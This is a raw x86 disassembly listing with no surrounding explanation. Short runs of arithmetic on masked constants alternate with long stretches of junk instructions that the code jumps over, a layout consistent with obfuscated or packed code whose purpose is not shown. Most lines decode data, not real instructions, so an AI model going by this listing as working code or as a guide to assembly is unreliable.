  40cf8a:	and    esp,DWORD PTR [ecx+eiz*8]
  40cf8d:	out    dx,eax
  40cf8e:	push   ebx
  40cf8f:	arpl   WORD PTR [edi],dx
  40cf91:	inc    edx
  40cf92:	in     al,dx
  40cf93:	adc    al,0x9b
  40cf95:	mov    ah,0x96
  40cf97:	jbe    0x40cf56
  40cf99:	adc    edi,edx
  40cf9b:	dec    edi
  40cf9c:	ret    0x9c6d
  40cf9f:	xlat   BYTE PTR ds:[ebx]
  40cfa0:	dec    eax
  40cfa1:	sub    al,0x18
  40cfa3:	ror    DWORD PTR [ecx+0x458b0845],1
  40cfa9:	call   0xc24490e1
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	lods   eax,DWORD PTR ds:[esi]
  40cfc9:	xor    DWORD PTR [edx+0x7e894c40],ebx
  40cfcf:	jle    0x40d010
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cf5a
  40cfd5:	jns    0x40cfe4
  40cfd7:	jge    0x40cfd2
  40cfd9:	gs add ah,cl
  40cfdc:	pop    ds
  40cfdd:	daa    
  40cfde:	xchg   BYTE PTR [eax],dh
  40cfe0:	stos   BYTE PTR es:[edi],al
  40cfe1:	adc    al,0xdd
  40cfe3:	jl     0x40d00f
  40cfe5:	mov    dl,ah
  40cfe7:	cdq    
  40cfe8:	fnstcw WORD PTR [edx-0x13]
  40cfeb:	xor    eax,0x5ec782ad
  40cff0:	lahf   
  40cff1:	add    al,0xbe
  40cff3:	mov    dl,0xa7
  40cff5:	sbb    BYTE PTR [ebx],ah
  40cff7:	pop    eax
  40cff8:	jp     0x40cfa0
  40cffa:	mov    edx,esp
  40cffc:	push   0x7057a157
  40d001:	fdiv   QWORD PTR [ebx+0x4b2c1b11]
  40d007:	jp     0x40d00d
  40d009:	pop    esi
  40d00a:	fcomp  DWORD PTR [edi]
  40d00c:	aaa    
  40d00d:	ins    BYTE PTR es:[edi],dx
  40d00e:	mov    edi,DWORD PTR [ebx-0x320d62aa]
  40d014:	pop    es
  40d015:	sub    BYTE PTR [ebx+0x72],dh
  40d018:	inc    BYTE PTR [ebx]
  40d01a:	pop    ebx
  40d01b:	mov    ebx,eax
  40d01d:	mov    eax,0xa2dab83f
  40d022:	cld    
  40d023:	lods   eax,DWORD PTR ds:[esi]
  40d024:	pusha  
  40d025:	pop    ebp
  40d026:	pushf  
  40d027:	fmulp  st(7),st
  40d029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d02a:	pushf  
  40d02b:	cmc    
  40d02c:	fbld   TBYTE PTR gs:[ecx-0x5ad55bab]
  40d033:	inc    ebx
  40d034:	pusha  
  40d035:	xchg   esi,eax
  40d036:	jae    0x40d054
  40d038:	dec    esp
  40d039:	dec    ecx
  40d03a:	push   esi
  40d03b:	pop    ebp
  40d03c:	mov    dh,0xd
  40d03e:	jnp    0x40d0a2
  40d040:	xor    eax,0x328302a2
  40d045:	pusha  
  40d046:	jo     0x40d059
  40d048:	retf   0x57bf
  40d04b:	sub    DWORD PTR [edi],edx
  40d04d:	inc    esp
  40d04e:	jle    0x40d08a
  40d050:	ret    
  40d051:	lds    esi,FWORD PTR [ebx]
  40d053:	arpl   bx,dx
  40d055:	pop    ebp
  40d056:	adc    eax,0xdcd0bb18
  40d05b:	sub    eax,0x374687d1
  40d060:	ret    
  40d061:	fxch   st(1)
  40d063:	push   ss
  40d064:	sub    DWORD PTR [esi+0x2a],ecx
  40d067:	adc    eax,0xce3d6e5d
  40d06c:	retf   0xd32c
  40d06f:	mov    dh,0x2b
  40d071:	ret    
  40d072:	fwait
  40d073:	jmp    0x7bb1:0x89ffadb5
  40d07a:	(bad)  
  40d07b:	stos   DWORD PTR es:[edi],eax
  40d07c:	hlt    
  40d07d:	inc    eax
  40d07e:	aas    
  40d07f:	adc    dl,BYTE PTR [ebp-0x6]
  40d082:	jns    0x40d097
  40d084:	hlt    
  40d085:	xor    DWORD PTR [ebp-0x37],ebp
  40d088:	cmp    eax,0x22a6db74
  40d08d:	sub    BYTE PTR [ebp-0x2d31b2a5],cl
  40d093:	dec    esi
  40d094:	adc    esi,DWORD PTR [ecx+ecx*8]
  40d097:	xor    BYTE PTR [ebx],dl
  40d099:	sbb    ax,0x9464
  40d09d:	(bad)  
  40d09e:	or     DWORD PTR [eax],eax
  40d0a0:	scas   eax,DWORD PTR es:[edi]
  40d0a1:	mov    dl,0x3c
  40d0a3:	mov    eax,ds:0xcfc61583
  40d0a8:	scas   eax,DWORD PTR es:[edi]
  40d0a9:	jmp    0xb28b0ab9
  40d0ae:	xchg   ebp,eax
  40d0af:	cwde   
  40d0b0:	mov    eax,ds:0xfcabeafa
  40d0b5:	inc    edi
  40d0b6:	add    eax,0x58e15312
  40d0bb:	mov    al,ds:0x34db715e
  40d0c0:	int    0x20
  40d0c2:	enter  0x1e2b,0xcf
  40d0c6:	xchg   ecx,eax
  40d0c7:	pushf  
  40d0c8:	fdivr  QWORD PTR [eax+esi*2]
  40d0cb:	arpl   WORD PTR [ebx-0x79],bp
  40d0ce:	xor    al,0x18
  40d0d0:	jmp    0xfbc2:0xb33d525f
  40d0d7:	push   ebx
  40d0d8:	lods   al,BYTE PTR ds:[esi]
  40d0d9:	lea    edi,[edx-0x673c0a11]
  40d0df:	addr16 dec ecx
  40d0e1:	add    eax,0x990f056a
  40d0e6:	xchg   DWORD PTR [ebp-0x75],edx
  40d0e9:	in     eax,dx
  40d0ea:	test   eax,0x31cd7d4d
  40d0ef:	xor    DWORD PTR [edi-0x2632c8b2],ebp
  40d0f5:	sahf   
  40d0f6:	jp     0x40d123
  40d0f8:	stos   DWORD PTR es:[edi],eax
  40d0f9:	cld    
  40d0fa:	xchg   esi,eax
  40d0fb:	fstp   TBYTE PTR [ecx-0x3b]
  40d0fe:	and    BYTE PTR [edi-0x1fd028b0],bh
  40d104:	cmp    al,dh
  40d106:	jecxz  0x40d146
  40d108:	push   ds
  40d109:	lds    esp,FWORD PTR [ecx]
  40d10b:	jae    0x40d09d
  40d10d:	es stc 
  40d10f:	or     cl,BYTE PTR [ecx]
  40d111:	stos   BYTE PTR es:[edi],al
  40d112:	mov    ds:0xd13353df,eax
  40d117:	mov    ecx,DWORD PTR [ebp+0x8]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	or     BYTE PTR [ebp+0xda939b2],0x8b
  40d164:	jle    0x40d1e4
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d109
  40d16b:	imul   esp,DWORD PTR [edx],0x3ff0286c
  40d171:	sbb    edx,DWORD PTR [esi-0x3b]
  40d174:	pop    esp
  40d175:	mov    eax,0xecd5f220
  40d17a:	aam    0xc4
  40d17c:	xor    eax,0xf277ee7c
  40d181:	pop    edi
  40d182:	jno    0x40d170
  40d184:	add    ebp,edi
  40d186:	gs gs mov bh,0xef
  40d18a:	lock mov BYTE PTR [ecx],bl
  40d18d:	and    eax,DWORD PTR [ecx-0x2ab7a383]
  40d193:	hlt    
  40d194:	ret    
  40d195:	mov    dl,0x3c
  40d197:	inc    ebp
  40d198:	in     al,0x19
  40d19a:	je     0x40d17d
  40d19c:	xchg   ebp,eax
  40d19d:	lods   al,BYTE PTR ds:[esi]
  40d19e:	sbb    BYTE PTR [ecx+0x1b],ah
  40d1a1:	not    DWORD PTR [ecx-0x5f]
  40d1a4:	inc    ebx
  40d1a5:	adc    BYTE PTR [eax],0x66
  40d1a8:	fist   DWORD PTR [ecx-0x7309c9a1]
  40d1ae:	fs pop eax
  40d1b0:	mov    al,0x61
  40d1b2:	mov    ds:0x5e9dfd8c,al
  40d1b7:	out    dx,eax
  40d1b8:	mov    esi,0x27eb9c8f
  40d1bd:	add    bl,BYTE PTR [esi-0x55]
  40d1c0:	dec    esp
  40d1c1:	das    
  40d1c2:	dec    esp
  40d1c3:	mov    bh,0xe9
  40d1c5:	or     al,0x3b
  40d1c7:	std    
  40d1c8:	std    
  40d1c9:	dec    esp
  40d1ca:	adc    eax,0x85220a40
  40d1cf:	jecxz  0x40d1b5
  40d1d1:	push   ds
  40d1d2:	aas    
  40d1d3:	(bad)  
  40d1d4:	and    eax,0x5dd033e6
  40d1d9:	or     eax,0x755b82a7
  40d1de:	jmp    esp
  40d1e0:	pop    eax
  40d1e1:	test   ecx,0xcf846716
  40d1e7:	icebp  
  40d1e8:	aad    0xd
  40d1ea:	sub    BYTE PTR [eax-0x6d],0xe9
  40d1ee:	adc    eax,0x995d93fa
  40d1f3:	push   0xffffffce
  40d1f5:	xlat   BYTE PTR ds:[ebx]
  40d1f6:	cli    
  40d1f7:	pop    esi
  40d1f8:	jns    0x40d208
  40d1fa:	add    eax,0x997d9577
  40d1ff:	sar    dl,cl
  40d201:	sahf   
  40d202:	inc    esi
  40d203:	adc    ah,BYTE PTR [eax+0x4d70c436]
  40d209:	clc    
  40d20a:	rcl    BYTE PTR [ebp+0x411d59f8],0x36
  40d211:	(bad)  
  40d212:	mov    ds:0x52370f5d,al
  40d217:	mov    al,0x64
  40d219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d21a:	jne    0x40d1e3
  40d21c:	lahf   
  40d21d:	scas   al,BYTE PTR es:[edi]
  40d21e:	jge    0x40d212
  40d220:	cmp    al,0xdb
  40d222:	sub    esp,DWORD PTR [eax+0x51815901]
  40d228:	adc    esi,DWORD PTR [esi+0x212e15ec]
  40d22e:	jb     0x40d1da
  40d230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d231:	sub    BYTE PTR [ecx],0x50
  40d234:	or     DWORD PTR [ecx],0x79
  40d237:	test   al,0xf3
  40d239:	mov    dl,0x8c
  40d23b:	mov    ds:0x317f0d1c,al
  40d240:	in     al,0xb5
  40d242:	mov    WORD PTR [ebx],cs
  40d244:	(bad)  
  40d245:	mov    bl,0xf0
  40d247:	loop   0x40d289
  40d249:	cmp    al,BYTE PTR [esi-0x4fccad03]
  40d24f:	dec    edx
  40d250:	sub    al,0x8f
  40d252:	mov    ebp,0xa5476989
  40d257:	pop    ecx
  40d258:	jecxz  0x40d2be
  40d25a:	daa    
  40d25b:	mov    ds:0x21cbf09,eax
  40d260:	inc    esi
  40d261:	mov    es,WORD PTR [esi-0x993a65c]
  40d267:	mov    ebx,0x8ca90ee9
  40d26c:	jbe    0x40d294
  40d26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d26f:	lods   eax,DWORD PTR ds:[esi]
  40d270:	lds    ecx,FWORD PTR [esi+0x5c]
  40d273:	or     ah,dl
  40d275:	jge    0x40d292
  40d277:	arpl   WORD PTR [ebx],sp
  40d279:	test   ch,cl
  40d27b:	jecxz  0x40d262
  40d27d:	mov    eax,ds:0x394a3bd4
  40d282:	stos   BYTE PTR es:[edi],al
  40d283:	pop    ebx
  40d284:	jmp    0x888:0x87952224
  40d28b:	arpl   WORD PTR [ebx],di
  40d28d:	dec    eax
  40d28e:	or     DWORD PTR [edx+0x1f],0xb6a6886
  40d295:	out    dx,eax
  40d296:	leave  
  40d297:	mov    ah,0xc0
  40d299:	cld    
  40d29a:	or     bh,BYTE PTR [esp+edi*8-0x23]
  40d29e:	inc    edi
  40d29f:	mov    esi,0x40c1559b
  40d2a4:	add    DWORD PTR [edi+edi*8+0x53],ebp
  40d2a8:	cmp    al,0x50
  40d2aa:	in     eax,dx
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	and    DWORD PTR [edi+0x3c],ebp
  40d2e4:	fcmovne st,st(6)
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d273
  40d2ee:	fst    st(2)
  40d2f0:	shr    BYTE PTR [esi-0x2e8068a5],cl
  40d2f6:	icebp  
  40d2f7:	mov    ebx,0xb46530a0
  40d2fc:	pop    ecx
  40d2fd:	and    al,0x67
  40d2ff:	push   edi
  40d300:	push   ds
  40d301:	retf   
  40d302:	cmp    BYTE PTR [edx+ecx*4-0x4a387a4b],dh
  40d309:	addr16 cwde 
  40d30b:	nop
  40d30c:	xchg   ecx,eax
  40d30d:	test   BYTE PTR [ecx+0x7f9a9d54],dl
  40d313:	fist   WORD PTR [edi]
  40d315:	outs   dx,BYTE PTR ds:[esi]
  40d316:	sbb    ah,BYTE PTR [edi]
  40d318:	xor    BYTE PTR [edi-0x17c03c7e],cl
  40d31e:	call   0x88c82d0c
  40d323:	(bad)  
  40d324:	add    bl,dl
  40d326:	mov    ebx,0x6e17eabf
  40d32b:	idiv   BYTE PTR [esi+0x78e6f652]
  40d331:	cs cs mov ebp,0x9a6e920a
  40d338:	jb     0x40d2e7
  40d33a:	(bad)  
  40d33b:	inc    ebp
  40d33c:	das    
  40d33d:	loopne 0x40d369
  40d33f:	jns    0x40d2e1
  40d341:	pushf  
  40d342:	xchg   BYTE PTR [eax],dl
  40d344:	lea    eax,[esi+0x2]
  40d347:	mov    dh,0x45
  40d349:	(bad)  
  40d34a:	nop
  40d34b:	scas   al,BYTE PTR es:[edi]
  40d34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d34d:	sub    bl,BYTE PTR [eax+0x49]
  40d350:	mov    eax,ds:0xb408d24e
  40d355:	add    esi,edi
  40d357:	and    BYTE PTR [edx],dh
  40d359:	add    ah,BYTE PTR [edx]
  40d35b:	push   ds
  40d35c:	stc    
  40d35d:	xchg   DWORD PTR [ebp+0x4c342963],esp
  40d363:	loope  0x40d33e
  40d365:	adc    bh,cl
  40d367:	push   ss
  40d368:	fldl2e 
  40d36a:	iret   
  40d36b:	jmp    0xad7f:0xbb0ad1d5
  40d372:	popf   
  40d373:	mov    ds:0x7ea97245,eax
  40d378:	mov    esp,0x494576eb
  40d37d:	rcr    BYTE PTR [eax],0x46
  40d380:	neg    ebx
  40d382:	loop   0x40d396
  40d384:	out    0x83,al
  40d386:	out    dx,al
  40d387:	pop    edx
  40d388:	push   ss
  40d389:	pop    eax
  40d38a:	cmp    DWORD PTR [ebx-0xf],edi
  40d38d:	xchg   ebx,eax
  40d38e:	inc    ebx
  40d38f:	ret    0xe1bc
  40d392:	dec    esp
  40d393:	mov    eax,0x26b68c46
  40d398:	mov    esi,0xfc978aca
  40d39d:	mov    WORD PTR [ebp-0x33fce977],es
  40d3a3:	test   BYTE PTR [ecx],ch
  40d3a5:	sbb    DWORD PTR [eax],esp
  40d3a7:	test   edx,esi
  40d3a9:	sub    ecx,DWORD PTR ss:[edi+0x1c580af4]
  40d3b0:	adc    edx,edx
  40d3b2:	lahf   
  40d3b3:	add    DWORD PTR [ebp+0x797cfb1f],ecx
  40d3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3ba:	addr16 aas 
  40d3bc:	push   cs
  40d3bd:	mov    cl,0xb9
  40d3bf:	jns    0x40d3ce
  40d3c1:	xchg   BYTE PTR [edi],bh
  40d3c3:	ret    0x7b98
  40d3c6:	jae    0x40d3d5
  40d3c8:	add    eax,0x818fb674
  40d3cd:	pop    es
  40d3ce:	adc    DWORD PTR [esi+0x23],0xffffffb9
  40d3d2:	dec    esp
  40d3d3:	aas    
  40d3d4:	push   ds
  40d3d5:	int3   
  40d3d6:	lahf   
  40d3d7:	jp     0x40d3cf
  40d3d9:	mov    bh,0xb1
  40d3db:	push   ecx
  40d3dc:	cld    
  40d3dd:	dec    ebx
  40d3de:	in     eax,dx
  40d3df:	lahf   
  40d3e0:	retf   
  40d3e1:	push   eax
  40d3e2:	cmp    al,0x4e
  40d3e4:	mov    bl,0xb8
  40d3e6:	xchg   esi,eax
  40d3e7:	fistp  QWORD PTR [ebp-0x7578b6f]
  40d3ed:	out    dx,eax
  40d3ee:	retf   
  40d3ef:	or     edi,ecx
  40d3f1:	push   esi
  40d3f2:	jae    0x40d37f
  40d3f4:	sbb    eax,0xd1a04fce
  40d3f9:	fwait
  40d3fa:	push   esi
  40d3fb:	lock sub al,0x89
  40d3fe:	nop
  40d3ff:	aad    0xe4
  40d401:	ss cmp edi,ebx
  40d404:	or     BYTE PTR [eax-0x9b36a4c],ah
  40d40a:	fadd   st,st(1)
  40d40c:	add    dl,cl
  40d40e:	xchg   edx,eax
  40d40f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d410:	pop    eax
  40d411:	dec    esp
  40d412:	sbb    DWORD PTR [ecx+0x3c8dc868],esp
  40d418:	jbe    0x40d3e3
  40d41a:	addr16 sub eax,0x36873d37
  40d420:	(bad)  
  40d421:	(bad)  
  40d422:	or     bl,BYTE PTR [ebp+0x36]
  40d425:	pop    ds
  40d426:	cmp    al,0xce
  40d428:	and    DWORD PTR [edi-0x61f4493f],esi
  40d42e:	mov    edx,DWORD PTR [ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	mov    bl,BYTE PTR [ecx-0x7b]
  40d44c:	cmp    DWORD PTR [edi+0x3f7e7e8d],ecx
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d47d
  40d456:	stos   DWORD PTR es:[di],eax
  40d458:	loopne 0x40d450
  40d45a:	xchg   BYTE PTR [edi],dh
  40d45c:	pop    edi
  40d45d:	out    0x3d,al
  40d45f:	loopne 0x40d3ee
  40d461:	mov    edi,0xb5b1350f
  40d466:	add    BYTE PTR [ebx+esi*2],ch
  40d469:	std    
  40d46a:	add    al,0xc7
  40d46c:	mov    dh,0x1b
  40d46e:	xlat   BYTE PTR ds:[ebx]
  40d46f:	push   ss
  40d470:	sub    DWORD PTR [eax],edi
  40d472:	out    dx,al
  40d473:	nop
  40d474:	xchg   edi,eax
  40d475:	icebp  
  40d476:	ror    BYTE PTR [ecx],0xa2
  40d479:	es stos BYTE PTR es:[edi],al
  40d47b:	sbb    eax,0x93f4f7be
  40d480:	pop    ecx
  40d481:	adc    dx,WORD PTR [ecx+eiz*8+0x49]
  40d486:	enter  0xdc1c,0x90
  40d48a:	push   eax
  40d48b:	ficom  DWORD PTR [ebx+eax*4+0x3b]
  40d48f:	imul   esi,DWORD PTR [ecx-0x4ff0738b],0x11
  40d496:	mov    ebx,0xcb1b71cd
  40d49b:	and    al,0x16
  40d49d:	xchg   ebx,eax
  40d49e:	loop   0x40d476
  40d4a0:	nop
  40d4a1:	push   es
  40d4a2:	adc    ch,al
  40d4a4:	test   al,0xcc
  40d4a6:	mov    eax,eax
  40d4a8:	pushf  
  40d4a9:	sub    eax,0xb27524bb
  40d4ae:	addps  xmm1,XMMWORD PTR [ebx+0x5083e2c2]
  40d4b5:	and    DWORD PTR [ebp+0x9],eax
  40d4b8:	inc    edx
  40d4ba:	fmulp  st(5),st
  40d4bc:	std    
  40d4bd:	rcl    BYTE PTR [esi-0x6108d2d],cl
  40d4c3:	leave  
  40d4c4:	add    ecx,esi
  40d4c6:	ret    0x506d
  40d4c9:	mov    ch,0xde
  40d4cb:	inc    edi
  40d4cc:	jp     0x40d44f
  40d4ce:	dec    ebp
  40d4cf:	cmp    BYTE PTR [ebx+0x282cd8fc],dl
  40d4d5:	ds test al,0x7c
  40d4d8:	es ret 0x48b9
  40d4dc:	(bad)  
  40d4dd:	jno    0x40d55a
  40d4df:	jns    0x40d526
  40d4e1:	mov    esi,0xeff6256b
  40d4e6:	call   DWORD PTR [esi]
  40d4e8:	sbb    esi,esi
  40d4ea:	out    0xc1,eax
  40d4ec:	lock aaa 
  40d4ee:	nop
  40d4ef:	mov    cl,0x64
  40d4f1:	sti    
  40d4f2:	or     eax,esi
  40d4f4:	popa   
  40d4f5:	repnz sbb eax,0xc8989eb1
  40d4fb:	mov    bh,0xd9
  40d4fd:	test   ecx,ecx
  40d4ff:	sbb    esp,DWORD PTR [eax]
  40d501:	push   edi
  40d502:	dec    edi
  40d503:	inc    edi
  40d504:	jo     0x40d50f
  40d506:	sub    BYTE PTR [eax],ah
  40d508:	or     al,cl
  40d50a:	cwde   
  40d50b:	jecxz  0x40d573
  40d50d:	hlt    
  40d50e:	mov    ecx,0x57560a80
  40d513:	jl     0x40d575
  40d515:	lds    ebx,FWORD PTR [eax+ebp*4]
  40d518:	mov    ecx,edi
  40d51a:	test   al,0xc
  40d51c:	adc    BYTE PTR [eax+edx*2+0x8],al
  40d520:	xchg   esp,eax
  40d521:	mov    al,0xc7
  40d523:	out    0x1c,al
  40d525:	daa    
  40d526:	jl     0x40d4c4
  40d528:	mov    BYTE PTR [ebx],0x9c
  40d52b:	adc    al,0x52
  40d52d:	int3   
  40d52e:	std    
  40d52f:	stc    
  40d530:	test   al,0xaf
  40d532:	adc    ebp,ebx
  40d534:	xchg   ebp,eax
  40d535:	pop    ss
  40d536:	sahf   
  40d537:	xchg   esi,eax
  40d538:	xor    DWORD PTR [ecx],edx
  40d53a:	pop    edi
  40d53b:	mov    BYTE PTR ds:0x615eed63,dl
  40d541:	es cmp eax,0x7e39466a
  40d547:	or     DWORD PTR [esp+eiz*2],eax
  40d54a:	das    
  40d54b:	ror    DWORD PTR [edi+0x0],cl
  40d54e:	push   eax
  40d54f:	add    dh,BYTE PTR [ecx]
  40d551:	pop    esi
  40d552:	inc    ecx
  40d553:	outs   dx,DWORD PTR ds:[esi]
  40d554:	cmp    ch,BYTE PTR [ecx+0x727910ca]
  40d55a:	nop
  40d55b:	cmc    
  40d55c:	add    ch,BYTE PTR [ebx]
  40d55e:	sub    BYTE PTR [eax+ecx*2+0x48],dh
  40d562:	xchg   esi,eax
  40d563:	xchg   esi,eax
  40d564:	adc    DWORD PTR [ebp+eax*2-0x30ff15d9],edi
  40d56b:	fs add eax,0xc84e5359
  40d571:	setno  BYTE PTR [ecx]
  40d574:	or     al,0x54
  40d576:	arpl   cx,bp
  40d578:	xor    BYTE PTR [ebp+0x79],0x3c
  40d57c:	repnz sbb al,0x1a
  40d57f:	ins    BYTE PTR es:[edi],dx
  40d580:	pop    eax
  40d581:	and    dl,BYTE PTR [eax]
  40d583:	add    DWORD PTR [ebp-0x76],edx
  40d586:	pop    ebx
  40d587:	xchg   edi,eax
  40d588:	xlat   BYTE PTR ds:[ebx]
  40d589:	lods   al,BYTE PTR ds:[esi]
  40d58a:	mov    ds:0xff7edff7,eax
  40d58f:	xchg   esi,eax
  40d590:	nop
  40d591:	adc    BYTE PTR [edx],al
  40d593:	mov    ebp,0x558bd0d3
  40d598:	cld    
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0x3a00fe4c
  40d5ac:	popf   
  40d5ad:	mov    bh,0x40
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d5e7
  40d5b7:	mov    ebp,0xeae8d639
  40d5bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5bd:	pop    esi
  40d5be:	lea    eax,[ebx]
  40d5c0:	rol    DWORD PTR [ebx],0x80
  40d5c3:	je     0x40d62c
  40d5c5:	mov    eax,ds:0xbccfa7d0
  40d5ca:	sbb    al,0xd0
  40d5cc:	setno  BYTE PTR [esi]
  40d5cf:	jl     0x40d5ac
  40d5d1:	sub    eax,0x77120e1f
  40d5d6:	push   ecx
  40d5d7:	mov    ds:0x293fbd23,eax
  40d5dc:	mov    eax,0xae8f64f
  40d5e1:	call   0x35a37efd
  40d5e6:	int3   
  40d5e7:	mov    eax,0xfdb8e061
  40d5ec:	mov    esp,0x897f9625
  40d5f1:	call   0x6a9cf5ae
  40d5f6:	scas   al,BYTE PTR es:[edi]
  40d5f7:	cmovg  edi,DWORD PTR [edx+0x1b0decd3]
  40d5fe:	xchg   DWORD PTR [edi+0x404ec760],edi
  40d604:	leave  
  40d605:	inc    ebp
  40d606:	addr16 js 0x40d5a0
  40d609:	inc    edi
  40d60a:	(bad)  [edi]
  40d60c:	clc    
  40d60d:	or     BYTE PTR [ebp+eax*2-0x56],0x92
  40d612:	out    0xf5,al
  40d614:	dec    esp
  40d615:	sub    BYTE PTR [ecx+0x49],bh
  40d618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d619:	cmp    al,0xb0
  40d61b:	stos   BYTE PTR es:[edi],al
  40d61c:	fs push ds
  40d61e:	mul    ebx
  40d620:	jp     0x40d691
  40d622:	arpl   WORD PTR [ecx],bp
  40d624:	xchg   ecx,eax
  40d625:	idiv   DWORD PTR [edi-0x5c7087e1]
  40d62b:	push   esi
  40d62c:	and    DWORD PTR [ecx],esi
  40d62e:	int    0x97
  40d630:	mov    al,ds:0xe4a96293
  40d635:	imul   esp,esi,0xffffff9e
  40d638:	test   dl,0x34
  40d63b:	stc    
  40d63c:	addr16 mov ch,0x30
  40d63f:	int3   
  40d640:	inc    eax
  40d641:	outs   dx,BYTE PTR ds:[esi]
  40d642:	cmp    ch,BYTE PTR [eax]
  40d644:	mov    esi,0xffbcdf45
  40d649:	das    
  40d64a:	jl     0x40d665
  40d64c:	int3   
  40d64d:	cdq    
  40d64e:	aas    
  40d64f:	stos   DWORD PTR es:[edi],eax
  40d650:	push   ss
  40d651:	or     dh,BYTE PTR [edx]
  40d653:	mov    ebx,DWORD PTR [ebx+0x6a]
  40d656:	inc    edx
  40d657:	jae    0x40d5df
  40d659:	(bad)  
  40d65a:	shl    BYTE PTR [ebp-0x40cf6757],1
  40d660:	cmp    DWORD PTR [ecx],0x91075fb0
  40d666:	lock cmp eax,0x2ac81200
  40d66c:	inc    esp
  40d66d:	push   edi
  40d66e:	pop    ebp
  40d66f:	add    BYTE PTR fs:[eax-0x169dd28],bl
  40d676:	inc    esi
  40d677:	popa   
  40d678:	fbld   TBYTE PTR [edi+0x7f341fe0]
  40d67e:	int    0x12
  40d680:	xor    DWORD PTR [edi],0xffffffb4
  40d683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d684:	sub    eax,0xa4507ece
  40d689:	jecxz  0x40d6da
  40d68b:	ret    
  40d68c:	sub    DWORD PTR [ecx-0x1366afc4],eax
  40d692:	js     0x40d6fa
  40d694:	mov    eax,0xb6d0b97a
  40d699:	sbb    DWORD PTR [ecx],0xffffffee
  40d69c:	jbe    0x40d673
  40d69e:	xor    eax,0x58f06ea4
  40d6a3:	test   DWORD PTR [ecx+edx*2-0x7b],esi
  40d6a7:	pop    ebx
  40d6a8:	int    0xa3
  40d6aa:	jge    0x40d66c
  40d6ac:	adc    bl,BYTE PTR ss:[esi-0x49e85f25]
  40d6b3:	lock fnsave [ebp+edi*4-0x20]
  40d6b8:	pop    ecx
  40d6b9:	xchg   DWORD PTR [ebx],ecx
  40d6bb:	xchg   ecx,eax
  40d6bc:	sub    bl,BYTE PTR [edi]
  40d6be:	adc    ch,BYTE PTR fs:[ecx-0x4f080d0]
  40d6c5:	psubsw mm1,mm2
  40d6c8:	mov    dh,0x43
  40d6ca:	cs fmul st,st(0)
  40d6cd:	xchg   bl,ch
  40d6cf:	imul   BYTE PTR [esi]
  40d6d1:	js     0x40d6bb
  40d6d3:	xor    esp,esp
  40d6d5:	mov    dh,0xd8
  40d6d7:	stos   BYTE PTR es:[edi],al
  40d6d8:	test   al,0x6c
  40d6da:	rcr    BYTE PTR [edi+0x9],1
  40d6dd:	jns    0x40d718
  40d6df:	cld    
  40d6e0:	or     DWORD PTR [esi+0x12d19a94],ebp
  40d6e6:	(bad)  [esi]
  40d6e8:	jmp    0xd82c:0xf2c2447d
  40d6ef:	cld    
  40d6f0:	pop    esi
  40d6f1:	mov    esi,0x2cc159ee
